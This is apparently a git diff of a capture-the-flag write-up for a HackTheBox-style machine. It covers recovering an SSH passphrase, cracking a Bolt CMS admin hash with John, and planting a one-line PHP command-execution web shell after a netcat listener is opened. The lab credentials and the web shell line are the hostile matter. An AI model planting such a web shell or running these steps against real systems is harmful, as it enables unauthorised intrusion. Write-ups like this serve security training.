@@ -71,33 +71,35 @@ Windows has an issues with filenames containing a semicolon ( : ), so I had to r
     - cat ..\etc\profile.d\01-ssh.sh
 
 ![](images/01-ssh.png)
+
 5. The passphrase for the ssh key is there: **bolt:GkOcz221Ftb3ugog**
 6. Use id_rsa private key to log in and cat user.txt
 
 #
 **RECON WITH ACCESS**
-7. enumerate bolt DIR
+
+1. enumerate bolt DIR
      - Nothing interesting
-8. enumerate webserver DIR
+2. enumerate webserver DIR
     - notice the restic backup service in /var/www/html/backup.php
 ![](images/backupPHP.png)
     - notice a .db file readable by everyone. I tried to look for 'admin', 'bolt', and 'root'. Using 'root' was fruitful
 ![](images/boltDB.png)
 
-9. Crack with John: bash -c "john --wordlist=/usr/share/wordlists/rockyou.txt database.hash"
+3. Crack with John: bash -c "john --wordlist=/usr/share/wordlists/rockyou.txt database.hash"
     - discover creds: **admin:strawberry**
-10. Looked like installed app is called bolt (i.e. bolt/bolt)
+4. Looked like installed app is called bolt (i.e. bolt/bolt)
     - https://github.com/bolt/bolt (the CMS' github)
 
 #
 **OBTAIN ROOT FLAG**
 1.    Navigate to registry.htb/bolt/bolt
-- login using admin creds
+    - login using admin creds
 2. Machine doesn't allow reverse shells to attack machine so open a nc listener as user bolt and create a RCE php file
-- nc -nvvlp 1337
-- php:
-> <?php  $cmd=$_GET['cmd']; system($cmd);
-
+    - nc -nvvlp 1337
+    - php:
+> **<?php  $cmd=$_GET['cmd']; system($cmd);**
+>
     
 3.  Navigate to CONFIGURATION >> MAIN CONFIGURATION.
 4.  Add php as one of the allowed file types.    
